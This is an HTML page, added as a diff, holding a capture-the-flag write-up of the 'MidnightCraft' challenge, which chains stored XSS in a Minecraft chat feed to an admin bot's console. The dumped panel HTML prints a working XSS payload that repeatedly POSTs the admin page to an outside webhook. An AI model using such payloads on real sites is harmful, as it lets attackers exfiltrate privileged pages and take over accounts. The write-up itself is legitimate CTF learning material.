@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>MidnightCraft 1/2  &ndash; alanoo.dev</title>
+    <meta name="description" content="My dev page :)">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="utf-8" />
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" integrity="sha512-HK5fgLBL+xu6dm/Ii3z4xhlSUyZgTT9tuc/hSrtw6uzJOvgRr2a9jyxxT1ely+B+xFAmJKVSTbpM/CuL7qxO8w==" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.1/css/academicons.min.css" integrity="sha512-b1ASx0WHgVFL5ZQhTgiPWX+68KjS38Jk87jg7pe+qC7q9YkEtFq0z7xCglv7qGIs/68d3mAp+StfC8WKC5SSAg==" crossorigin="anonymous" />
+    <link rel="stylesheet" href="/css/colour/gruvbox-dark.css">
+    <link rel="stylesheet" href="/css/colour/dark-mode.css">
+    <link rel="stylesheet" href="/css/risotto.css">
+    <link rel="stylesheet" href="/css/custom.css">
+</head>
+
+<body>
+    <div class="page">
+        <header class="page__header">
+            <h1 class="page__logo"><a href="/" class="page__logo-inner">alanoo.dev</a></h1>
+            <nav class="page__nav main-nav">
+                <ul>
+    
+    
+                    <li class="main-nav__item"><a class="nav-main-item" href="/achievements/" title="Posts">Achievements</a></li>
+                    
+                    <li class="main-nav__item"><a class="nav-main-item" href="/writeups/" title="Writeups">Writeups</a></li>
+                
+                    <li class="main-nav__item"><a class="nav-main-item" href="/posts/" title="Projects">wip</a></li>
+                    
+                    </ul>
+            </nav>
+        </header>
+
+        <section class="page__body">
+            <header class="content__header">
+                <h1>MidnightCraft 1/2 <code><span style="color:#cfa63f">misc</code> <code><span style="color:#2ed8e8">web</code></pre></h1>
+            </header>
+            <div class="content__body">
+                <h2 id="kategori">Category</h2>
+                <p>Misc</p>
+                <h2 id="author">Chall Author</h2>
+                <p>BIEN_SUR</p>
+                <h2 id="stats">Stats</h2>
+                <p>Total Solves: <strong>8/600 Teams</strong></p>
+                <p>Final Points: <strong>484p</strong></p>
+                <h2 id="description">Description</h2>
+                <p>A new minecraft server has opened its gates and appears to be connected to a showcase website. Compromise it to discover what was meant to stay hidden. Deployment : http://deploy.midnightflag.fr.</p>
+                <p>For your information, when you launch the challenge, 3 ports will be available: "py-mctf" port is the showcase website. "mc-mctf" contains two ports. First one is the Minecraft server. Second one will be prompted to you when reaching the website.</p>
+                <h2 id="prewords">Preface</h2>
+                <p>This was probably our favourite chall of the ctf. Why, you may ask. Well simply because of the nostalgia playing minecraft again and to call it <strong>"productive"</strong> simply because it's part of a ctf.<p>
+
+                <p>The chall is made up by two parts, the minecraft part and the more ctfy web part. Let's dive in!</p>
+                <h2 id="mcserver">Joining the Minecraft Server</h2>
+                <p>Joining the minecraft server we were greeted with this amazing spawn build:</p>
+                <p><img src="/writeups/midnightflag-2025/midnightcraft/assets/image.png"></p>
+                <p>Playing around with the commands and looking around we found that the server used a custom plugin called "MidnightFlagCTF".</p>
+                <p>It had 2 commands, /flag and /discord. The relevant one of course being /flag which required operator to execute.</p>
+                <p><img src="/writeups/midnightflag-2025/midnightcraft/assets/image2.png"></p>
+                <p>Now we have a goal, making ourselves operator and getting the flag!</p>
+                <p><strong><span style="color:#e76e6e">GOAL:</span><span style="color:#dfcde4"> Becoming operator!</strong></p>
+
+                <h2 id="website">Looking at the website</h2>
+                <p>Looking at the website it's a well designed frontend (props to chall author) with 2 key functionalities. The login page and also the minecraft chat. The minecraft server chat is connected through a websocket and shown on the website.</p>
+                <p><img src="/writeups/midnightflag-2025/midnightcraft/assets/image3.png"></p>
+                <p><img src="/writeups/midnightflag-2025/midnightcraft/assets/image4.png"></p>
+                <p>There is also some javascript on the page regarding the "Report abusive behaviour" button:</p>
+                <div class="highlight">
+                    <pre style="font-size: 14px;"><code class="language-javascript">
+document.getElementById('send-report-btn').addEventListener('click', async () => {
+    const responseDiv = document.getElementById('report-response');
+    const button = document.getElementById('send-report-btn');
+
+    button.disabled = true;
+    button.classList.remove('bg-green-500', 'hover:bg-green-700');
+    button.classList.add('bg-red-500', 'hover:bg-red-600', 'cursor-not-allowed');
+    responseDiv.textContent = 'Report is being sent...';
+
+    try {
+        const response = await fetch('/report', { method: 'GET' });
+
+        if (response.status === 429) {
+            responseDiv.textContent = "You have reached the limit of reports. Please wait a few minutes and try again.";
+            responseDiv.classList.add('text-red-500');
+            return;
+        }
+
+        if (!response.ok) {
+            throw new Error(`HTTP Error : ${response.status}`);
+        }
+
+        const data = await response.json();
+        responseDiv.textContent = data.report;
+        responseDiv.classList.remove('text-red-500');
+        responseDiv.classList.add('text-green-500');
+
+    } catch (error) {
+        console.error('Error when trying to send the report:', error);
+        responseDiv.textContent = 'We are sorry; the report could not be sent. Please retry.';
+        responseDiv.classList.add('text-red-500');
+    }
+
+
+    setTimeout(() => {
+        button.disabled = false;
+        button.classList.remove('bg-red-500', 'hover:bg-red-600', 'cursor-not-allowed');
+        button.classList.add('bg-green-500', 'hover:bg-green-700');
+        
+    }, 5000);
+});
+                    </code></pre>
+                </div>
+                <p></p>
+                <p>This is interesting, it bascially gets the 5 latest chat messages and sends it to a bot that presumably "looks" at them. This is giving a lot of nostalgia to past web challs containing an admin bot.</p>
+                <p>Our first instinct is to try to see if we can insert any html/js into the website. Thus we try some simple XSS payloads through the minecraft chat:</p>
+                <p><img src="/writeups/midnightflag-2025/midnightcraft/assets/image5.png"></p>
+                <p>This one didn't work... Buuuuut:</p>
+                <p><img src="/writeups/midnightflag-2025/midnightcraft/assets/image6.png"></p>
+                <p>This one did :)</p>
+                <p><img src="/writeups/midnightflag-2025/midnightcraft/assets/image7.png"></p>
+                <p><strong>THIS IS HUGE!</strong> We basically have a working XSS exploit now. Our guess was that the login page has a terminal that we can access to for example /op ourselves. This guess is primarily based of our past experiences with minecraft server hosts.</p>
+                <h2 id="abusingxss">Abusing XSS</h2>
+                <p>Now that we have this XSS exploit we can see how to actually exploit it. Turns out, the report button hits the /panel page using the bot. Probably Playwright in Python, judging by the mctf-py ID from the deploy page. Anyway as I previously mentioned our idea was to probably find a terminal in the panel tab of the site.</p>
+                <p>So the best way to find the functions is just to dump the whole html of the panel site using the bot. We did this using this payload:</p>
+                <p><img src="/writeups/midnightflag-2025/midnightcraft/assets/img1.png"></p>
+                <p>Then by clicking the button we checked our webhook...</p>
+                <p><img src="/writeups/midnightflag-2025/midnightcraft/assets/image8.png"></p>
+                <p><img src="/writeups/midnightflag-2025/midnightcraft/assets/image9.png"></p>
+                <div class="highlight">
+                    <pre style="font-size: 14px;"><code class="language-html">
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Admin Panel - Minecraft Server&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/css/panel.css&quot;&gt;
+    &lt;script src=&quot;https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js&quot; defer=&quot;&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;flex&quot;&gt;
+        &lt;div class=&quot;sidebar&quot;&gt;
+            &lt;h1 class=&quot;sidebar-title&quot;&gt;Midnight Craft&lt;/h1&gt;
+            &lt;nav class=&quot;mt-5&quot;&gt;
+                &lt;a href=&quot;#&quot; class=&quot;nav-link active&quot;&gt;Console&lt;/a&gt;
+                &lt;a href=&quot;/&quot; class=&quot;nav-link&quot;&gt;Home&lt;/a&gt;
+            &lt;/nav&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;main-content&quot;&gt;
+            &lt;h2 class=&quot;console-header&quot;&gt;Console&lt;/h2&gt;
+            &lt;div id=&quot;chatBox&quot; class=&quot;chat-box&quot;&gt;
+                
+                    &lt;p class=&quot;log-text&quot;&gt;[2025-04-16 00:29:36] &lt;strong&gt;syudou&lt;/strong&gt; : &lt;img onerror=&quot;window.setInterval(function(){fetch('/panel').then(data =&gt; data.text()).then(data =&gt; fetch('https://webhook.site/6628b753-adf9-4522-bd4a-593ca1ad70cc',{method:'POST',body:data}))}, 5000)&quot; src=&quot;x&quot;&gt;&lt;/p&gt;
+                
+            &lt;/div&gt;
+            &lt;div class=&quot;mt-3 flex&quot;&gt;
+                &lt;input type=&quot;text&quot; id=&quot;cmd&quot; class=&quot;input-field&quot; placeholder=&quot;Send a command...&quot; x-model=&quot;command&quot;&gt;
+                &lt;button id=&quot;cmd_btn&quot; class=&quot;send-button&quot; type=&quot;submit&quot;&gt;Envoyer&lt;/button&gt;
+            &lt;/div&gt;
+            &lt;div id=&quot;commandResponse&quot; class=&quot;command-response&quot;&gt;&lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+    &lt;script&gt;
+        const chatBox = document.getElementById('chatBox');
+        chatBox.scrollTop = chatBox.scrollHeight;
+    &lt;/script&gt;&lt;/body&gt;
+&lt;/html&gt;
+                    </code></pre>  
+                </div>
+
+                <p></p>
+                <p><strong>BINGO!</strong></p>
+                <h2 id="gettingoperator">Getting Operator</h2>
+                <p>Looking at the panel's html and js we can clearly see that this is a minecraft console/terminal. This means that our theory was right!</p>
+                <p>The only thing left now was to abuse this newfound power to make the bot /op us and that's exactly what we did using this payload:</p>
+                
+                <h2 id="finalpayloads">Final Payload</h2>
+                <p><img src="/writeups/midnightflag-2025/midnightcraft/assets/finalpayload.png"></p>
+                <h2 id="flag">Flag</h2>
+                <p><img src="/writeups/midnightflag-2025/midnightcraft/assets/flag.png"></p>
+                <code><span style="color:#c3b8de">MCTF{209eea248a86815d157c618dd8ef0f14}</span></code>
+                <h2 id="afterwords">Afterwords</h2>
+                <p>I would firstly like to praise the chall author BIEN_SUR for this amazing challenge! There are plenty of XSS challs but this one made it extremely fun!</p>
+                <p>From having years and years of experience playing and developing minecraft servers I could see this actually being used in real life scenarios due to the amount of servers using real-time chats.</p>
+                <p>So once again thank you BIEN_SUR for this exciting challenge and your hard work especially with the builds lmao.</p>
+
+            </div>
+            <footer class="content__footer"></footer>
+        </section>
+
+        <section class="page__aside">
+            <div class="aside__about">
+                <div class="aside__about">
+                    <h1 class="about__title">alanoo.dev</h1>
+                    <p class="about__description">My dev page :).</p>
+                </div>
+                <ul class="aside__social-links">
+                    <li>
+                        <a href="https://admin.tryhackme.com" rel="me" aria-label="secret" title="secret"><i class="fas fa-flag" aria-hidden="true"></i></a>&nbsp;
+                    </li>
+                </ul>
+                
+            </div>
+            <hr>
+            <div class="aside__content">
+                <p>
+                    By alanoo, 
+                    2025-04-16
+                </p>
+                <hr>
+                <span style="color:#ca7c9f">Table of Contents:</span>
+                <nav id="TableOfContents">
+
+                    <div style="white-space: nowrap;">
+                        <span style="color:#4d5859">1.</span> <a href="#description">Description</a>
+                      </div>
+                      <div style="white-space: nowrap;">
+                        <span style="color:#4d5859">2.</span> <a href="#prewords">Preface</a>
+                      </div>
+                      <div style="white-space: nowrap;">
+                        <span style="color:#4d5859">3.</span> <a href="#mcserver">Joining the Minecraft Server</a>
+                      </div>
+                      <div style="white-space: nowrap;">
+                        <span style="color:#4d5859">4.</span> <a href="#website">Looking at the Website</a>
+                      </div>
+                    <div><span style="color:#4d5859">5.</span> <a href="#abusingxss">Abusing XSS</a></div>
+                    <div><span style="color:#4d5859">6.</span> <a href="#gettingoperator">Getting Operator</a></div>
+                    <div><span style="color:#4d5859">7.</span> <a href="#finalpayloads">Final Payload</a></div>
+                    <div><span style="color:#4d5859">8.</span> <a href="#flag">Flag</a></div>
+                    <div><span style="color:#4d5859">9.</span> <a href="#afterwords">Afterwords</a></div>
+
+        </nav>
+
+        
+                        </div>
+                        <p></p>
+                        <div class="logo-container" style="display: flex; justify-content: center; align-items: center;">
+                            <img src="https://midnightflag.fr/assets/img/logo_midnight-flag.svg">
+                          </div>
+                    </section>
+        
+                    <footer class="page__footer"><p>
+        
+            <p class="copyright"></p>
+            <p class="advertisement">Powered by <a href="https://gohugo.io/">hugo</a> and <a href="https://github.com/joeroe/risotto">risotto</a>.</p>
+        </footer>
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-html.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+
+</body>
+
+</html>
